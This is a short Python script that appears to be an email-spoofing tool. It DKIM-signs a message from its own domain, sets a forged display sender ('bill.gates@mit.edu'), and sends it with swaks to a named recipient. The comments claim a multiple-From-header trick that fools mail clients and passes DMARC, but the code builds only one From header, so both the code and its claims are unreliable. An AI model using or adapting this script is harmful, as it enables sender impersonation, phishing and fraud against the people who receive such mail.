#!/usr/bin/env python3
import dkim
# pip3 install dkimpy --break-system-packages
import subprocess

# Email details
envelope_from = 'sender@secure-session.info'  # Envelope sender (MAIL FROM)
to_addr = 'antoniomattar123@outlook.com'
subject = 'Test Email'
body = 'This is a test email with DKIM.'

# The spoofed address that will appear in email clients
spoofed_display = 'bill.gates@mit.edu'
# The legitimate address that DMARC checks

# Create email message with MULTIPLE From headers
# The LAST From header is what DMARC checks
# The FIRST From header is what email clients display
message = f"""From: {spoofed_display}
To: {to_addr}
Subject: {subject}

{body}
""".replace('\n', '\r\n')

# Read private key
# Change le PATH
with open('/Users/antonio-mattar/dkim-keys/default.private', 'rb') as f:
    private_key = f.read()

# Sign with DKIM - this will sign the legitimate From header
signature = dkim.sign(
    message.encode(),
    b'default',
    b'secure-session.info',
    private_key,
    include_headers=[b'from', b'to', b'subject']
)

# Combine signature and message
signed_message = signature.decode() + message

# Send via swaks
cmd = ['swaks', '--from', envelope_from, '--to', to_addr, '--tls', '--data', '-']
process = subprocess.Popen(cmd, stdin=subprocess.PIPE)
process.communicate(input=signed_message.encode())

print("Email sent with multiple From headers!")
print(f"Display From: {spoofed_display}")
print(f"DMARC From: {envelope_from}")
